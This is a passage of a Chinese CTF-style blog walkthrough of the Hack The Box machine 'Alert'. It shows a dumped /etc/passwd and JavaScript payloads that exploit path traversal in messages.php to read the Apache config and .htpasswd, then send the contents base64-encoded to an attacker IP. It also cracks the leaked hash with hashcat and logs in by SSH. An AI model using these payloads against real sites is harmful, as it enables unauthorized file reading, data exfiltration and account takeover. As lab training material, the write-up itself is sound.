class="hljs-attr">mail</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">8</span>:<span class="hljs-number">8</span>:<span class="hljs-attr">mail</span>:<span class="hljs-regexp">/var/m</span><span class="hljs-attr">ail</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">news</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">9</span>:<span class="hljs-number">9</span>:<span class="hljs-attr">news</span>:<span class="hljs-regexp">/var/</span>spool/<span class="hljs-attr">news</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">uucp</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-attr">uucp</span>:<span class="hljs-regexp">/var/</span>spool/<span class="hljs-attr">uucp</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">proxy</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">13</span>:<span class="hljs-number">13</span>:<span class="hljs-attr">proxy</span>:<span class="hljs-regexp">/bin:/u</span>sr/sbin/nologin<br>www-<span class="hljs-attr">data</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www-<span class="hljs-attr">data</span>:<span class="hljs-regexp">/var/</span><span class="hljs-attr">www</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">backup</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">34</span>:<span class="hljs-number">34</span>:<span class="hljs-attr">backup</span>:<span class="hljs-regexp">/var/</span><span class="hljs-attr">backups</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">list</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">38</span>:<span class="hljs-number">38</span>:<span class="hljs-title class_">Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span>:<span class="hljs-regexp">/var/</span><span class="hljs-attr">list</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">irc</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">39</span>:<span class="hljs-number">39</span>:<span class="hljs-attr">ircd</span>:<span class="hljs-regexp">/var/</span>run/<span class="hljs-attr">ircd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">gnats</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">41</span>:<span class="hljs-number">41</span>:<span class="hljs-title class_">Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin):<span class="hljs-regexp">/var/</span>lib/<span class="hljs-attr">gnats</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">nobody</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:<span class="hljs-attr">nobody</span>:<span class="hljs-regexp">/nonexistent:/u</span>sr/sbin/nologin<br>systemd-<span class="hljs-attr">network</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">100</span>:<span class="hljs-number">102</span>:systemd <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,:<span class="hljs-regexp">/run/</span><span class="hljs-attr">systemd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br>systemd-<span class="hljs-attr">resolve</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">101</span>:<span class="hljs-number">103</span>:systemd <span class="hljs-title class_">Resolver</span>,,,:<span class="hljs-regexp">/run/</span><span class="hljs-attr">systemd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br>systemd-<span class="hljs-attr">timesync</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">102</span>:<span class="hljs-number">104</span>:systemd <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,:<span class="hljs-regexp">/run/</span><span class="hljs-attr">systemd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">messagebus</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">103</span>:<span class="hljs-number">106</span>::<span class="hljs-regexp">/nonexistent:/u</span>sr/sbin/nologin<br><span class="hljs-attr">syslog</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">104</span>:<span class="hljs-number">110</span>::<span class="hljs-regexp">/home/</span><span class="hljs-attr">syslog</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">_apt</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">105</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/nonexistent:/u</span>sr/sbin/nologin<br><span class="hljs-attr">tss</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">106</span>:<span class="hljs-number">111</span>:<span class="hljs-variable constant_">TPM</span> software stack,,,:<span class="hljs-regexp">/var/</span>lib/<span class="hljs-attr">tpm</span>:<span class="hljs-regexp">/bin/</span><span class="hljs-literal">false</span><br><span class="hljs-attr">uuidd</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">107</span>:<span class="hljs-number">112</span>::<span class="hljs-regexp">/run/uui</span><span class="hljs-attr">dd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">tcpdump</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">108</span>:<span class="hljs-number">113</span>::<span class="hljs-regexp">/nonexistent:/u</span>sr/sbin/nologin<br><span class="hljs-attr">landscape</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">109</span>:<span class="hljs-number">115</span>::<span class="hljs-regexp">/var/</span>lib/<span class="hljs-attr">landscape</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">pollinate</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">110</span>:<span class="hljs-number">1</span>::<span class="hljs-regexp">/var/</span>cache/<span class="hljs-attr">pollinate</span>:<span class="hljs-regexp">/bin/</span><span class="hljs-literal">false</span><br>fwupd-<span class="hljs-attr">refresh</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">111</span>:<span class="hljs-number">116</span>:fwupd-refresh user,,,:<span class="hljs-regexp">/run/</span><span class="hljs-attr">systemd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">usbmux</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">112</span>:<span class="hljs-number">46</span>:usbmux daemon,,,:<span class="hljs-regexp">/var/</span>lib/<span class="hljs-attr">usbmux</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">sshd</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">113</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/run/</span><span class="hljs-attr">sshd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br>systemd-<span class="hljs-attr">coredump</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">999</span>:<span class="hljs-number">999</span>:systemd <span class="hljs-title class_">Core</span> <span class="hljs-title class_">Dumper</span>:<span class="hljs-regexp">/:/u</span>sr/sbin/nologin<br><span class="hljs-attr">albert</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:<span class="hljs-attr">albert</span>:<span class="hljs-regexp">/home/</span><span class="hljs-attr">albert</span>:<span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-attr">lxd</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">998</span>:<span class="hljs-number">100</span>::<span class="hljs-regexp">/var/</span>snap/lxd/common/<span class="hljs-attr">lxd</span>:<span class="hljs-regexp">/bin/</span><span class="hljs-literal">false</span><br><span class="hljs-attr">david</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">1001</span>:<span class="hljs-number">1002</span>:,,,:<span class="hljs-regexp">/home/</span><span class="hljs-attr">david</span>:<span class="hljs-regexp">/bin/</span>bash<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure>
+
+<p>之后就可以想到<code>statistics.alert.htb</code>​需要一个认证，可以通过遍历读取到敏感信息</p>
+<p>网站的 Apache 配置通常存储在 中<code>/etc/apache2/sites-enabled</code>​。默认名称为<code>000-default.conf</code>​</p>
+<p>再次修改读取一下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-enabled/000-default.conf&#x27;</span>, <span class="hljs-literal">false</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">var</span> req2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.63:8000/?content=&#x27;</span> + <span class="hljs-title function_">btoa</span>(req.<span class="hljs-property">responseText</span>),<span class="hljs-literal">true</span>);<br>req2.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure>
+
+<p>解码之后信息为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="hljs-title class_">RewriteEngine</span> <span class="hljs-title class_">On</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^alert\.<span class="hljs-property">htb$</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^$<br>    <span class="hljs-title class_">RewriteRule</span> ^<span class="hljs-regexp">/?(.*)$ http:/</span><span class="hljs-regexp">/alert.htb/</span>$1 [R=<span class="hljs-number">301</span>,L]<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br>        <span class="hljs-title class_">Options</span> <span class="hljs-title class_">Indexes</span> <span class="hljs-title class_">FollowSymLinks</span> <span class="hljs-title class_">MultiViews</span><br>        <span class="hljs-title class_">AllowOverride</span> <span class="hljs-title class_">All</span><br>        <span class="hljs-title class_">AuthType</span> <span class="hljs-title class_">Basic</span><br>        <span class="hljs-title class_">AuthName</span> <span class="hljs-string">&quot;Restricted Area&quot;</span><br>        <span class="hljs-title class_">AuthUserFile</span> /<span class="hljs-keyword">var</span>/www/statistics.<span class="hljs-property">alert</span>.<span class="hljs-property">htb</span>/.<span class="hljs-property">htpasswd</span><br>        <span class="hljs-title class_">Require</span> valid-user<br>    &lt;/<span class="hljs-title class_">Directory</span>&gt;<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br>&lt;/pre&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>可以看到<code>AuthUserFile /var/www/statistics.alert.htb/.htpasswd</code>​，于是读取一下对应的敏感信息</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd&#x27;</span>, <span class="hljs-literal">false</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">var</span> req2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.63:8000/?content=&#x27;</span> + <span class="hljs-title function_">btoa</span>(req.<span class="hljs-property">responseText</span>),<span class="hljs-literal">true</span>);<br>req2.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure>
+
+<p>解码之后信息为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="hljs-attr">albert</span>:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这是一串APR1(MD5-based)密码哈希，可以用hashcat进行解密</p>
+<p>将上面另存为文档</p>
+<p>​<code>hashcat -a 0 -m 1600  alert.hash /home/dream/桌面/rockyou.txt</code>​</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330214212-zj9obyh.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>解密成功为<code>manchesterunited</code>​</p>
+<p>之后可以成功登陆<code>statistics.alert.htb</code>​</p>
+<p>nmap一下可以看到开放了22端口</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215202-cjolve2.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>用刚刚获得的用户名密码ssh连接一下试试</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215431-rf0sv97.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>成功连接<br>​<img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215806-czq6bvu.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>获取第一个flag</p>
+<hr>
+<p>清明节回来本想继续做这个机器，结果发现居然要花钱了</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408151006-enyol34.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>后面的提权只能遗憾退场了，以后一定一次把机器渗透完，绝不拖延！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/htb/" class="print-no-link">#htb</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB_Alert</div>
+      <div>http://example.com/post/alert-z1tfcsg.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Dre4m</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/free-and-open-source-oneclick-deployment-solution-5yk6g.html" title="免费开源的一键化部署方案">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">免费开源的一键化部署方案</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"vklZyGJHIw3vHy3PTGM92QOy-gzGzoHsz","appKey":"uiPwluTg2cOzOaF4R6Ljpxw4","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
